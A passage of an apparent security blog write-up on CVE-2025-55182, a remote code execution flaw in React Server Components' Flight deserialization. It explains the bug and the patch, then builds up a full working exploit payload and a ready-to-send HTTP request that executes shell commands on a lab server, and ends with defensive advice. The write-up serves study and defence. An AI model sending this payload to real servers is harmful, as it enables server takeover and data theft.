</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=s2>&#34;*&#34;</span> <span class=o>===</span> <span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>    <span class=o>?</span> <span class=nx>moduleExports</span> 
</span></span><span class=line><span class=cl>    <span class=o>:</span> <span class=s2>&#34;&#34;</span> <span class=o>===</span> <span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> 
</span></span><span class=line><span class=cl>    <span class=o>?</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=nx>__esModule</span> 
</span></span><span class=line><span class=cl>      <span class=o>?</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=k>default</span> 
</span></span><span class=line><span class=cl>      <span class=o>:</span> <span class=nx>moduleExports</span> 
</span></span><span class=line><span class=cl>    <span class=o>:</span> <span class=nx>moduleExports</span><span class=p>[</span><span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]];</span>  <span class=c1>// ← VULNERABLE LINE
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><strong>The Bug:</strong> The line <code>moduleExports[metadata[2]]</code> uses bracket notation WITHOUT checking if <code>metadata[2]</code> is an own property. This allows attackers to access inherited properties like <code>constructor</code> - exactly the attack we explored in the JavaScript fundamentals section!</p><h4 id=why-this-matters-1>Why This Matters</h4><p>When a client sends a Server Action request, <code>metadata[2]</code> contains the export name to access. The code assumes this will be a legitimate export like <code>"saveUser"</code> or <code>"updateProfile"</code>. But there&rsquo;s no validation!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Legitimate use
</span></span></span><span class=line><span class=cl><span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;saveUser&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>moduleExports</span><span class=p>[</span><span class=s2>&#34;saveUser&#34;</span><span class=p>]</span>  <span class=c1>// ✓ Accesses the saveUser function
</span></span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Malicious use - attacker controls metadata[2]
</span></span></span><span class=line><span class=cl><span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;constructor&#34;</span>
</span></span><span class=line><span class=cl><span class=nx>moduleExports</span><span class=p>[</span><span class=s2>&#34;constructor&#34;</span><span class=p>]</span>  <span class=c1>// ✗ Accesses inherited Function constructor!
</span></span></span></code></pre></div><h3 id=the-fix-react-1901>The Fix (React 19.0.1+)</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Patched version with hasOwnProperty check
</span></span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>requireModule</span><span class=p>(</span><span class=nx>metadata</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>moduleExports</span> <span class=o>=</span> <span class=nx>__webpack_require__</span><span class=p>(</span><span class=nx>metadata</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c1>// ... promise handling code ...
</span></span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;*&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>moduleExports</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=nx>__esModule</span> <span class=o>?</span> <span class=nx>moduleExports</span><span class=p>.</span><span class=k>default</span> <span class=o>:</span> <span class=nx>moduleExports</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c1>// ✓ THE FIX: Check if property is owned before accessing
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>hasOwnProperty</span><span class=p>.</span><span class=nx>call</span><span class=p>(</span><span class=nx>moduleExports</span><span class=p>,</span> <span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>moduleExports</span><span class=p>[</span><span class=nx>metadata</span><span class=p>[</span><span class=mi>2</span><span class=p>]];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=c1>// If not an own property, fail safely
</span></span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=kc>undefined</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><hr><h2 id=how-the-exploit-works>How the Exploit Works</h2><p>The exploitation of CVE-2025-55182 is a masterclass in chaining multiple subtle vulnerabilities. Understanding this requires a deep dive into React&rsquo;s Flight protocol and how attackers weaponized its features.</p><h3 id=understanding-react-flight-protocol>Understanding React Flight Protocol</h3><p>React Server Components use the &ldquo;Flight&rdquo; protocol to serialize and deserialize data between client and server. The protocol uses a reference syntax to efficiently transmit complex data structures.</p><h4 id=flight-protocol-reference-syntax>Flight Protocol Reference Syntax</h4><table><thead><tr><th>Pattern</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td><code>$&lt;id></code></td><td>Reference entire chunk by ID</td><td><code>"$1"</code> → resolves to chunk 1&rsquo;s contents</td></tr><tr><td><code>$&lt;id>:key</code></td><td>Reference specific property from chunk</td><td><code>"$2:companyName"</code> → gets companyName from chunk 2</td></tr><tr><td><code>$&lt;id>:nested.path</code></td><td>Access nested properties</td><td><code>"$3:user.email"</code> → gets email from user object in chunk 3</td></tr></tbody></table><h4 id=example-normal-flight-protocol-usage>Example: Normal Flight Protocol Usage</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;0&#34;</span><span class=o>:</span> <span class=s1>&#39;[&#34;$1&#34;]&#39;</span><span class=p>,</span>                                    <span class=c1>// Array containing reference to chunk 1
</span></span></span><span class=line><span class=cl>  <span class=s2>&#34;1&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;object&#34;:&#34;cat&#34;,&#34;name&#34;:&#34;$2:catName&#34;}&#39;</span><span class=p>,</span>      <span class=c1>// Object with property reference
</span></span></span><span class=line><span class=cl>  <span class=s2>&#34;2&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;catName&#34;:&#34;asteroidDestroyer&#34;}&#39;</span><span class=p>,</span>           <span class=c1>// Data source
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Resolution Process:
</span></span></span><span class=line><span class=cl><span class=c1>// 1. Chunk 0: [&#34;$1&#34;] - Array with reference to chunk 1
</span></span></span><span class=line><span class=cl><span class=c1>// 2. Chunk 1: {object: &#34;cat&#34;, name: &#34;$2:catName&#34;} - Object with property reference
</span></span></span><span class=line><span class=cl><span class=c1>// 3. Chunk 2: {catName: &#34;asteroidDestroyer&#34;} - Source data
</span></span></span><span class=line><span class=cl><span class=c1>// 4. Final Result:
</span></span></span><span class=line><span class=cl><span class=p>[</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>object</span><span class=o>:</span> <span class=s2>&#34;cat&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>name</span><span class=o>:</span> <span class=s2>&#34;asteroidDestroyer&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span></code></pre></div><hr><h3 id=attack-technique-1-prototype-chain-traversal>Attack Technique 1: Prototype Chain Traversal</h3><p>React Flight failed to validate that referenced properties existed on target objects before accessing them, allowing attackers to traverse JavaScript&rsquo;s prototype chain.</p><h4 id=attack-payload>Attack Payload</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;0&#34;</span><span class=o>:</span> <span class=s1>&#39;[&#34;$1:__proto__:constructor:constructor&#34;]&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;1&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;x&#34;:1}&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=resolution-chain>Resolution Chain</h4><table><thead><tr><th>Step</th><th>Operation</th><th>Result</th></tr></thead><tbody><tr><td>1</td><td><code>$1</code> resolves to chunk 1</td><td><code>{x: 1}</code></td></tr><tr><td>2</td><td><code>:__proto__</code> accesses prototype</td><td><code>Object.prototype</code></td></tr><tr><td>3</td><td><code>:constructor</code> accesses constructor</td><td><code>Object()</code> constructor function</td></tr><tr><td>4</td><td><code>:constructor</code> again</td><td><code>Function()</code> constructor</td></tr></tbody></table><p><strong>Final Result:</strong> <code>[Function: Function]</code> - The global Function constructor</p><p><strong>Critical Flaw:</strong> React trusted all property paths without validating they were legitimate data properties rather than JavaScript internals. The prototype chain is always accessible through <code>__proto__</code>, and React&rsquo;s deserialization followed these references blindly.</p><hr><h3 id=attack-technique-2-thenables---turning-data-into-execution>Attack Technique 2: Thenables - Turning Data into Execution</h3><p>A &ldquo;thenable&rdquo; is any object with a <code>.then</code> method. When JavaScript encounters <code>await obj</code>, if <code>obj.then</code> exists, the runtime <strong>automatically invokes</strong> <code>.then(resolve, reject)</code> with two callback functions.</p><h4 id=attack-payload-1>Attack Payload</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;0&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;then&#34;:&#34;$1:__proto__:constructor:constructor&#34;}&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;1&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;x&#34;:1}&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=execution-flow>Execution Flow</h4><pre tabindex=0><code>1. Deserialization produces: {then: Function}
2. Application code executes: await decodedReply
3. JavaScript runtime detects .then property
4. Automatically invokes: Function(resolve, reject)
5. Function() attempts to execute arguments as code
6. Result: SyntaxError (because resolve/reject functions aren&#39;t valid code strings)
</code></pre><p><strong>Key Insight:</strong> Attackers don&rsquo;t need to explicitly call functions. By placing <code>Function</code> in the <code>.then</code> property, JavaScript&rsquo;s own async/await mechanism triggers execution automatically.</p><hr><h3 id=attack-technique-3-breaking-the-object-boundary-with->Attack Technique 3: Breaking the Object Boundary with <code>$@</code></h3><h4 id=the--syntax>The <code>$@</code> Syntax</h4><table><thead><tr><th>Syntax</th><th>Behavior</th><th>Use Case</th></tr></thead><tbody><tr><td><code>$1</code></td><td>Resolves chunk 1 to final value</td><td>Normal data access: <code>{x: 1}</code></td></tr><tr><td><code>$@1</code></td><td>Returns raw chunk object</td><td>Internal operations: chunk metadata, <code>.then()</code> method</td></tr></tbody></table><h4 id=attack-payload-2>Attack Payload</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;0&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;then&#34;: &#34;$1:__proto__:then&#34;}&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;1&#34;</span><span class=o>:</span> <span class=s1>&#39;&#34;$@0&#34;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=why--exists-legitimate-use>Why <code>$@</code> Exists (Legitimate Use)</h4><p>React uses <code>$@</code> internally for:</p><ul><li><strong>Streaming support:</strong> Pass unresolved chunks between components</li><li><strong>Incremental rendering:</strong> Reference chunks before they&rsquo;re fully loaded</li><li><strong>Async coordination:</strong> Treat chunks as thenables for promise-like behavior</li></ul><h4 id=why--is-dangerous>Why <code>$@</code> Is Dangerous</h4><p>When attackers control Flight payloads, <code>$@</code> exposes:</p><ul><li><strong>Chunk prototypes:</strong> Access to <code>Chunk.prototype.then</code></li><li><strong>Internal state:</strong> <code>status</code>, <code>_response</code>, <code>reason</code> fields</li><li><strong>Runtime internals:</strong> Breaks abstraction between data and execution context</li></ul><p><strong>Critical Flaw:</strong> React exposed internal syntax to untrusted input without sanitization.</p><hr><h3 id=attack-technique-4-forcing-second-deserialization-with-status>Attack Technique 4: Forcing Second Deserialization with <code>status</code></h3><p>React&rsquo;s <code>initializeModelChunk()</code> function provides special processing for chunks marked as <code>"resolved_model"</code>. Attackers discovered they could trigger this privileged code path by setting a client-controlled <code>status</code> field.</p><h4 id=attack-payload-3>Attack Payload</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;0&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;then&#34;:&#34;$1:__proto__:then&#34;,&#34;status&#34;:&#34;resolved_model&#34;}&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;1&#34;</span><span class=o>:</span> <span class=s1>&#39;&#34;$@0&#34;&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=internal-logic>Internal Logic</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>chunk</span><span class=p>.</span><span class=nx>status</span> <span class=o>===</span> <span class=s2>&#34;resolved_model&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>initializeModelChunk</span><span class=p>(</span><span class=nx>chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Inside initializeModelChunk:
</span></span></span><span class=line><span class=cl>  <span class=kd>var</span> <span class=nx>parsed</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>chunk</span><span class=p>.</span><span class=nx>value</span><span class=p>);</span>        <span class=c1>// Parse chunk.value
</span></span></span><span class=line><span class=cl>  <span class=nx>reviveModel</span><span class=p>(</span><span class=nx>chunk</span><span class=p>.</span><span class=nx>_response</span><span class=p>,</span> <span class=nx>parsed</span><span class=p>);</span>        <span class=c1>// Second deserialization!
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=exploitation-flow>Exploitation Flow</h4><pre tabindex=0><code>1. Chunk contains status: &#34;resolved_model&#34;
2. React calls initializeModelChunk(chunk)
3. Function parses chunk.value as JSON
4. Calls reviveModel() with chunk._response as context
5. Result: A second deserialization pass with attacker-controlled context
</code></pre><p><strong>Critical Flaw:</strong> The <code>status</code> field had no validation. React assumed only its own code would set <code>status: "resolved_model"</code>.</p><hr><h3 id=attack-technique-5-context-confusion-via-_response>Attack Technique 5: Context Confusion via <code>_response</code></h3><p>The <code>_response</code> object serves as the execution context for React Flight&rsquo;s deserialization. By providing a malicious <code>_response</code>, attackers completely control the environment where chunk references are resolved.</p><h4 id=key-components>Key Components</h4><table><thead><tr><th>Field</th><th>Purpose</th><th>Malicious Use</th></tr></thead><tbody><tr><td><code>reason: -1</code></td><td>Bypasses error check in initializeModelChunk</td><td><code>-1.toString(16)</code> causes error if validated</td></tr><tr><td><code>value</code></td><td>JSON parsed during second pass</td><td>Contains blob reference <code>$B0</code></td></tr><tr><td><code>_response</code></td><td>Execution context for second pass</td><td><strong>Fully attacker-controlled</strong></td></tr><tr><td><code>_response._formData.get</code></td><td>Should fetch form data</td><td><strong>Points to Function() constructor</strong></td></tr><tr><td><code>_response._prefix</code></td><td>Blob ID prefix</td><td><strong>Contains attacker&rsquo;s code payload</strong></td></tr></tbody></table><p><strong>Critical Flaw:</strong> React trusted the <code>_response</code> object without validation, allowing attackers to hijack the entire deserialization context.</p><hr><h3 id=attack-technique-6-blob-resolution---the-kill-chain>Attack Technique 6: Blob Resolution - The Kill Chain</h3><p>React Flight handles binary data through &ldquo;blob references&rdquo; (prefixed with <code>$B</code>). The blob resolution mechanism fetches data using <code>response._formData.get()</code>.</p><h4 id=vulnerable-code-simplified>Vulnerable Code (Simplified)</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>case</span> <span class=s2>&#34;B&#34;</span><span class=o>:</span>  <span class=c1>// Handle blob references like &#34;$B0&#34;
</span></span></span><span class=line><span class=cl>  <span class=c1>// BUG: response._formData.get is attacker-controlled
</span></span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=nx>response</span><span class=p>.</span><span class=nx>_formData</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=nx>response</span><span class=p>.</span><span class=nx>_prefix</span> <span class=o>+</span> <span class=nx>blobId</span><span class=p>);</span>
</span></span></code></pre></div><h4 id=exploitation-flow-1>Exploitation Flow</h4><pre tabindex=0><code>1. Second pass processes: {&#34;then&#34;: &#34;$B0&#34;}
2. &#34;$B0&#34; triggers blob handler
3. response._formData.get → resolves to Function()
4. response._prefix + &#34;0&#34; → &#34;MALICIOUS_CODE&#34; + &#34;0&#34;
5. Function(&#34;MALICIOUS_CODE0&#34;) called
6. Creates function containing attacker code
7. Function returned as .then property
8. await automatically invokes .then()
9. Attacker code executes on server
</code></pre><p><strong>Critical Flaw:</strong> React called <code>_formData.get()</code> without verifying it was a legitimate FormData method rather than the Function constructor.</p><hr><h3 id=attack-technique-7-weaponized-rce-payload>Attack Technique 7: Weaponized RCE Payload</h3><h4 id=complete-exploit>Complete Exploit</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;0&#34;</span><span class=o>:</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;then&#34;</span><span class=o>:</span> <span class=s2>&#34;$1:__proto__:then&#34;</span><span class=p>,</span>              <span class=c1>// Hijack .then
</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;status&#34;</span><span class=o>:</span> <span class=s2>&#34;resolved_model&#34;</span><span class=p>,</span>               <span class=c1>// Force initializeModelChunk()
</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;reason&#34;</span><span class=o>:</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span>                             <span class=c1>// Bypass error check
</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;value&#34;</span><span class=o>:</span> <span class=s1>&#39;{&#34;then&#34;: &#34;$B0&#34;}&#39;</span><span class=p>,</span>               <span class=c1>// Blob reference for second pass
</span></span></span><span class=line><span class=cl>    <span class=s2>&#34;_response&#34;</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;_formData&#34;</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;get&#34;</span><span class=o>:</span> <span class=s2>&#34;$1:__proto__:constructor:constructor&#34;</span>  <span class=c1>// Point to Function()
</span></span></span><span class=line><span class=cl>      <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;_prefix&#34;</span><span class=o>:</span> <span class=s2>&#34;require(&#39;child_process&#39;).exec(&#39;COMMAND_HERE&#39;);&#34;</span>  <span class=c1>// RCE payload
</span></span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}),</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;1&#34;</span><span class=o>:</span> <span class=s1>&#39;&#34;$@0&#34;&#39;</span><span class=p>,</span>                               <span class=c1>// Self-reference
</span></span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h4 id=component-by-component-breakdown>Component-by-Component Breakdown</h4><p><strong>1. <code>"then": "$1:__proto__:then"</code></strong></p><ul><li><strong>Purpose:</strong> Hijack the <code>.then</code> property to point to React&rsquo;s internal <code>Chunk.prototype.then</code> method</li><li><strong>Why Not Function Directly?:</strong> Using the prototype&rsquo;s <code>.then</code> makes the object look like a legitimate React chunk, avoiding early detection</li></ul><p><strong>2. <code>"status": "resolved_model"</code></strong></p><ul><li><strong>Purpose:</strong> Force React to treat the chunk as fully resolved</li><li><strong>Effect:</strong> Unlocks <code>initializeModelChunk()</code> execution path</li><li><strong>Trust Violation:</strong> React assumed only internal code would set this status</li></ul><p><strong>3. <code>"reason": -1</code></strong></p><ul><li><strong>Purpose:</strong> Bypass validation in <code>initializeModelChunk()</code></li><li><strong>Code Being Bypassed:</strong> <code>var rootReference = chunk.reason.toString(16);</code> // -1 causes error if checked</li></ul><p><strong>4. <code>"value": '{"then": "$B0"}'</code></strong></p><ul><li><strong>Purpose:</strong> Nested JSON with blob reference for second deserialization pass</li><li><strong>Flow:</strong> Parsed by <code>JSON.parse(chunk.value)</code> → triggers blob handler</li></ul><p><strong>5. <code>"_response"</code></strong></p><ul><li><strong>Purpose:</strong> Completely attacker-controlled execution context</li><li><strong>Contains:</strong> <code>_formData.get</code> (points to Function constructor) and <code>_prefix</code> (contains RCE payload)</li></ul><p><strong>6. <code>"_formData.get": "$1:__proto__:constructor:constructor"</code></strong></p><ul><li><strong>Purpose:</strong> Redirect data-fetching to code execution</li><li><strong>Chain:</strong> <code>{x:1}</code> → <code>Object.prototype</code> → <code>Object</code> → <code>Function</code></li><li><strong>Result:</strong> <code>response._formData.get()</code> becomes <code>Function()</code></li></ul><p><strong>7. <code>"_prefix": "require('child_process').exec('...')"</code></strong></p><ul><li><strong>Purpose:</strong> The actual malicious code to execute</li><li><strong>Execution:</strong> <code>Function(this_string)</code> creates executable function with attacker&rsquo;s Node.js code</li></ul><p><strong>8. <code>"$@0"</code></strong></p><ul><li><strong>Purpose:</strong> Self-referential loop allowing chunk 0 to reference itself</li><li><strong>Effect:</strong> Enables the complex circular reference chain needed for exploitation</li></ul><h4 id=complete-attack-flow>Complete Attack Flow</h4><ol><li><strong>Initial Request:</strong> Attacker sends crafted POST request with weaponized Flight protocol payload</li><li><strong>First Deserialization:</strong> React processes chunk 0, establishing thenable with <code>$1:__proto__:then</code></li><li><strong>Status Trigger:</strong> <code>status: "resolved_model"</code> forces <code>initializeModelChunk()</code> execution</li><li><strong>Second Deserialization:</strong> <code>value</code> field parsed with attacker-controlled <code>_response</code> context</li><li><strong>Blob Resolution:</strong> <code>$B0</code> triggers call to <code>_formData.get()</code> which resolves to <code>Function()</code></li><li><strong>Code Execution:</strong> <code>Function(_prefix + "0")</code> creates and returns executable function</li><li><strong>Automatic Invocation:</strong> JavaScript&rsquo;s <code>await</code> mechanism calls the malicious <code>.then</code> method</li><li><strong>Post-Exploitation:</strong> Attacker&rsquo;s Node.js code executes with full server privileges</li></ol><hr><h2 id=the-poc>The POC</h2><h3 id=step-1-find-the-vulnerable-application>Step 1: Find the Vulnerable Application</h3><p>Find the vulnerable application link here: <a href=https://github.com/awwfensive/auditPlayground/tree/main/CVE/react2shell-lab>https://github.com/awwfensive/auditPlayground/tree/main/CVE/react2shell-lab</a></p><p>Clone the repo and run <code>node server.js</code>. This will setup the Next.js vulnerable application with default configurations.</p><h3 id=step-2-craft-and-send-the-exploit>Step 2: Craft and Send the Exploit</h3><p>We know that:</p><ul><li>Server Actions are enabled (Next.js / React Server Components)</li><li>The server accepts <code>multipart/form-data</code></li><li>The framework blindly rehydrates objects from user input</li><li>Prototype pollution + thenables are reachable during deserialization</li></ul><p>Therefore, according to the <a href=https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3>POC by maple</a>, craft the POST request:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>localhost:3000</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundary</span>
</span></span><span class=line><span class=cl><span class=n>Next-Action</span><span class=o>:</span> <span class=l>test</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundary
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;0&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>[&#34;$1&#34;]
</span></span><span class=line><span class=cl>------WebKitFormBoundary
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;1&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{&#34;then&#34;:&#34;$2:__proto__:then&#34;,&#34;status&#34;:&#34;resolved_model&#34;,&#34;reason&#34;:-1,&#34;value&#34;:&#34;{\&#34;then\&#34;:\&#34;$B0\&#34;}&#34;,&#34;_response&#34;:{&#34;_formData&#34;:{&#34;get&#34;:&#34;$2:__proto__:constructor:constructor&#34;},&#34;_prefix&#34;:&#34;require(&#39;child_process&#39;).execSync(&#39;whoami &gt; /tmp/pwned.txt&#39;);&#34;}}
</span></span><span class=line><span class=cl>------WebKitFormBoundary
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;2&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&#34;$@1&#34;
</span></span><span class=line><span class=cl>------WebKitFormBoundary--
</span></span></code></pre></div><p>The Terminal pops!</p><hr><h2 id=real-world-impact>Real-World Impact</h2><h3 id=what-attackers-can-do>What Attackers Can Do</h3><ul><li><strong>Execute System Commands:</strong> Spawn shells, run arbitrary binaries</li><li><strong>Read Sensitive Files:</strong> Access environment variables, configuration files, database credentials</li><li><strong>Write Files:</strong> Install backdoors, modify application code</li><li><strong>Exfiltrate Data:</strong> Steal customer data, API keys, source code</li><li><strong>Establish Persistence:</strong> Create new users, modify SSH keys, install remote access tools</li><li><strong>Lateral Movement:</strong> Use compromised server as pivot point to attack internal infrastructure</li></ul><h3 id=observed-in-the-wild>Observed in the Wild</h3><p>Since December 5, 2025, security researchers have observed active exploitation including:</p><ul><li><strong>Cryptocurrency miners:</strong> Deploying mining malware on compromised servers</li><li><strong>Cobalt Strike:</strong> Establishing C2 beacons for further exploitation</li><li><strong>State-sponsored activity:</strong> Unit 42 identified activity linked to CL-STA-1015, suspected ties to PRC&rsquo;s Ministry of State Security</li><li><strong>Automated scanning:</strong> Mass exploitation attempts using tools like Nuclei</li><li><strong>Botnet operations:</strong> Mirai and Rondo variants targeting vulnerable servers</li></ul><hr><h2 id=additional-related-vulnerabilities>Additional Related Vulnerabilities</h2><blockquote><p><strong>CVE-2025-55184 (CVSS 7.5):</strong> Denial of Service vulnerability in React Server Components</p><p><strong>CVE-2025-55183 (CVSS 5.3):</strong> Source Code Exposure vulnerability</p><p><strong>CVE-2025-67779:</strong> Additional vulnerability discovered during remediation efforts</p></blockquote><hr><h2 id=key-takeaways-for-developers>Key Takeaways for Developers</h2><h3 id=security-best-practices>Security Best Practices</h3><ul><li><strong>Always use hasOwnProperty:</strong> When accessing object properties with user-controlled keys, ALWAYS check <code>hasOwnProperty()</code> first</li><li><strong>Understand prototype chain risks:</strong> Bracket notation <code>obj[key]</code> traverses the entire prototype chain - this is dangerous with untrusted input</li><li><strong>Validate deserialization:</strong> Never trust deserialized data from untrusted sources without strict validation</li><li><strong>Defense in depth:</strong> Even if you don&rsquo;t expose dangerous modules, prototype access enables other attacks</li><li><strong>Keep dependencies updated:</strong> Framework vulnerabilities affect you even if your code is secure</li></ul><h3 id=for-security-teams>For Security Teams</h3><ul><li>Scan all React/Next.js deployments immediately</li><li>Assume compromise if vulnerable versions were exposed since December 5</li><li>Look for IOCs: unusual POST requests, process spawning, file modifications</li><li>Consider this vulnerability class when assessing other JavaScript frameworks</li></ul><hr><h2 id=technical-resources>Technical Resources</h2><ul><li><a href=https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components>Official React Security Advisory</a></li><li><a href=https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp>Next.js Security Advisory (GHSA-9qr9-h5gf-34mp)</a></li><li><a href=https://github.com/ejpir/CVE-2025-55182-research>Technical Analysis by ejpir</a></li><li><a href=https://github.com/msanft/CVE-2025-55182>Working PoC by Moritz Sanft</a></li><li><a 